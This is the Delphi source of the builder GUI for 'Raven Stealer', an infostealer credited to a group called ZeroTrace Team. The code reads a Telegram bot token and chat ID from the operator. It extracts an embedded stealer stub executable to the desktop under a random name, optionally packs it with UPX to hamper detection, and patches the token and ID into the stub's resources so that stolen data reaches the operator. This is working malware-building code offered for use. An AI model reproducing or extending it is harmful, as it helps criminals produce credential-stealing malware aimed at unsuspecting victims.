unit RavenStealerMain;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, scControls, scGPControls, Vcl.ExtCtrls,
  Vcl.BaseImageCollection, Vcl.ImageCollection, System.ImageList, Vcl.ImgList,
  Vcl.VirtualImageList, Vcl.Imaging.pngimage, scStyledForm, scGPExtControls,
  scGPPagers, scGPImages, Vcl.StdCtrls, IdBaseComponent, IdComponent,
  IdCustomTCPServer, IdTCPServer, Vcl.ComCtrls, System.Generics.Collections,
  IdHTTP, IdTCPConnection, IdTCPClient, IdURI,
  IdSSLOpenSSL, IdSSL, System.JSON, System.IOUtils, System.UITypes, Math, IdContext, IdGlobal,
  Vcl.Menus,Winapi.CommCtrl, Winapi.MMSystem,
  scModernControls, Vcl.Mask, System.NetEncoding, Winapi.ShellAPI,   Winapi.Dwmapi,  Winapi.UxTheme, ShlObj, ActiveX;

        type
  _MARGINS = record
    cxLeftWidth: Integer;
    cxRightWidth: Integer;
    cyTopHeight: Integer;
    cyBottomHeight: Integer;
  end;



type
  TForm1 = class(TForm)
    scGPPanel1: TscGPPanel;
    scGPButton1: TscGPButton;
    scGPPanel2: TscGPPanel;
    scGPButton8: TscGPButton;
    scGPPanel6: TscGPPanel;
    scGPPanel3: TscGPPanel;
    Label7: TLabel;
    scGPPanel9: TscGPPanel;
    MemoChatID: TscEdit;
    MemoBotToken: TscEdit;
    scGPButton7: TscGPButton;
    scGPSwitch2: TscGPSwitch;
    VirtualImageList1: TVirtualImageList;
    ImageCollection1: TImageCollection;
    scGPImage1: TscGPImage;
    scGPPanel10: TscGPPanel;
    Label11: TLabel;
    scMemo1: TscMemo;
    scGPComboBox1: TscGPComboBox;
    procedure FormCreate(Sender: TObject);
    procedure scGPSwitch2ChangeState(Sender: TObject);
    procedure scGPButton7Click(Sender: TObject);
    procedure scGPButton8Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure UpdateResourceString(const PEFile: string; ResourceID: Integer; const NewValue: string);
var
  hUpdate: THandle;
  Data: TBytes;
  ResType: PChar;
begin
  hUpdate := BeginUpdateResource(PChar(PEFile), False);
  if hUpdate = 0 then
    RaiseLastOSError;

  try
    Data := TEncoding.UTF8.GetBytes(NewValue);
    ResType := MAKEINTRESOURCE(RT_RCDATA);

   if not UpdateResource(hUpdate, ResType, MAKEINTRESOURCE(ResourceID), 1033, @Data[0], Length(Data)) then

      RaiseLastOSError;
  finally
    if not EndUpdateResource(hUpdate, False) then
      RaiseLastOSError;
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
var
  Shadow: Integer;
  Margins: Winapi.UxTheme._MARGINS;  // Use the correct type from UxTheme
const
  DWMWCP_ROUND = 2;
  DWMWA_WINDOW_CORNER_PREFERENCE = 33;
  var
  ComputerName: string;
  Size: DWORD;
begin
      scGPComboBox1.ItemIndex := 0;

  // Enable shadow
  Shadow := 1;
  DwmSetWindowAttribute(Handle, DWMWA_NCRENDERING_POLICY, @Shadow, SizeOf(Shadow));

  // Set up margins for shadow
  Margins.cxLeftWidth := 2;
  Margins.cxRightWidth := 2;
  Margins.cyTopHeight := 2;
  Margins.cyBottomHeight := 2;
  DwmExtendFrameIntoClientArea(Handle, Margins);

  // Make form background proper for shadow
  SetWindowLong(Handle, GWL_EXSTYLE,
    GetWindowLong(Handle, GWL_EXSTYLE) or WS_EX_LAYERED);
 // SetLayeredWindowAttributes(Handle, 0, 255, LWA_ALPHA);
end;



function GetDesktopPath: string;
var
  Folder: array[0..MAX_PATH] of Char;
begin
  if SHGetSpecialFolderPath(0, Folder, CSIDL_DESKTOPDIRECTORY, False) then
    Result := Folder
  else
    Result := ExtractFilePath(ParamStr(0)); // fallback to app dir
end;

function ExtractStubFromResourceToDesktop(out ExtractedPath: string): Boolean;
var
  RS: TResourceStream;
  RandName: string;
  DesktopPath: string;
begin
  DesktopPath := IncludeTrailingPathDelimiter(GetDesktopPath);
  RandName := DesktopPath + TPath.GetRandomFileName + '.exe';
  try
    RS := TResourceStream.Create(HInstance, 'Resource_1', RT_RCDATA);
    try
      RS.SaveToFile(RandName);
      ExtractedPath := RandName;
      Result := True;
    finally
      RS.Free;
    end;
  except
    Result := False;
  end;
end;

procedure TForm1.scGPButton7Click(Sender: TObject);
var
  FilePath, ChatID, BotToken: string;
begin
  ChatID := MemoChatID.Text;
  BotToken := MemoBotToken.Text;

  if Trim(ChatID) = '' then
  begin
    ShowMessage('Chat ID cannot be empty.');
    Exit;
  end;

  if Trim(BotToken) = '' then
  begin
    ShowMessage('Bot Token cannot be empty.');
    Exit;
  end;

  if not ExtractStubFromResourceToDesktop(FilePath) then
  begin
    ShowMessage('Failed to extract RavenStub.exe from resources.');
    Exit;
  end;

if scGPComboBox1.ItemIndex = 0 then
begin
  // No packing selected, continue
end
else
begin
  // Packing selected
  var UpxPath := ExtractFilePath(ParamStr(0)) + 'upx.exe';

  if not FileExists(UpxPath) then
  begin
    ShowMessage('upx.exe not found in current directory. Packing skipped.');
  end
  else
  begin
    var SI: TStartupInfo;
    var PI: TProcessInformation;
    var CmdLine: string;
    var ExitCode: DWORD;

    ZeroMemory(@SI, SizeOf(SI));
    ZeroMemory(@PI, SizeOf(PI));
    SI.cb := SizeOf(SI);

    CmdLine := Format('"%s" "%s"', [UpxPath, FilePath]);

    if CreateProcess(nil, PChar(CmdLine), nil, nil, False, 0, nil, nil, SI, PI) then
    begin
      // Wait until the UPX process exits
      WaitForSingleObject(PI.hProcess, INFINITE);
      GetExitCodeProcess(PI.hProcess, ExitCode);
      CloseHandle(PI.hProcess);
      CloseHandle(PI.hThread);

      if ExitCode <> 0 then
      begin
        ShowMessage('UPX packing failed with exit code ' + IntToStr(ExitCode));
        Exit;
      end;
    end
    else
    begin
      ShowMessage('Failed to execute upx.exe.');
      Exit;
    end;
  end;
end;





  try
    UpdateResourceString(FilePath, 102, ChatID);
    UpdateResourceString(FilePath, 103, BotToken);
    ShowMessage('Build successful!' + sLineBreak + 'Saved as: ' + FilePath);




  except
    on E: Exception do
    begin
      ShowMessage('Failed to update resources: ' + E.Message);
      DeleteFile(FilePath); // Clean up on failure
    end;
  end;
end;

procedure TForm1.scGPButton8Click(Sender: TObject);
begin
  MessageBox(Handle,
    'This software is created by ZeroTrace Team.' + sLineBreak +
    'Visit: https://t.me/ZeroTraceDevOfficial',
    'About',
    MB_OK or MB_ICONINFORMATION);
end;


procedure TForm1.scGPSwitch2ChangeState(Sender: TObject);
begin
if scGPSwitch2.State = scswOn then
begin
     MemoChatID.Enabled := true;
     MemoBotToken.Enabled := true;
     scGPButton7.Enabled := true;
end
else
begin
         MemoChatID.Enabled := false;
     MemoBotToken.Enabled := false;
     scGPButton7.Enabled := false;
end;
end;

end.
